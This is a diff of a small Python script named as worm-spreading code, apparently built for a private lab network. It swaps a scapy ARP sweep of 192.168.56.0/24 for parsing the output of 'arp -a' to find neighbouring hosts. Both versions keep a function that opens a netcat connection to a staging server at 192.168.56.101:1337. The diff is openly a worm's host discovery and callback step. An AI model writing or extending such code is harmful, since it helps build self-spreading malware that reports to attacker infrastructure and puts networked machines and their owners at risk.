@@ -1,36 +1,23 @@
-#!/usr/bin/env python3
-import sys
+#!/usr/bin/env python
+
 import subprocess
 
-from scapy.all import ARP, Ether, srp
-
 def worm_spread():
-    target_ip = "192.168.56.0/24"
+ 
+    machines = subprocess.check_output(["arp", "-a"])
+    print(machines)
 
-    # create ARP packet
-    arp = ARP(pdst=target_ip)
+    machine_list = machines.split()
 
-    # create the Ether broadcast packet
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    for i in machine_list:
+        #parse for ip addresses- contain more than 13 charac but less than 17
+        if len(i) > 13 and len(i) < 17:
+            print(i)
 
-    # stack them
-    packet = ether/arp
-    result = srp(packet, timeout=3, verbose=0)[0]
+(worm_spread())
 
-    # a list of clients, to be filled in the upcoming loop
-    clients = []
-    for sent,received in result:
-        clients.append(received.psrc)
-    try:
-        clients.remove('192.168.56.1') 
-        clients.remove('192.168.56.100')
-        clients.remove('192.168.56.101')
-    except:
-        pass
-    return clients
-print(worm_spread())
 
 def nc_listener():
     #sending to staging server via netcat
-    subprocess.run(["nc", "192.168.56.101", "1337"])
+    subprocess.call(["nc", "192.168.56.101", "1337"])
 print(nc_listener())
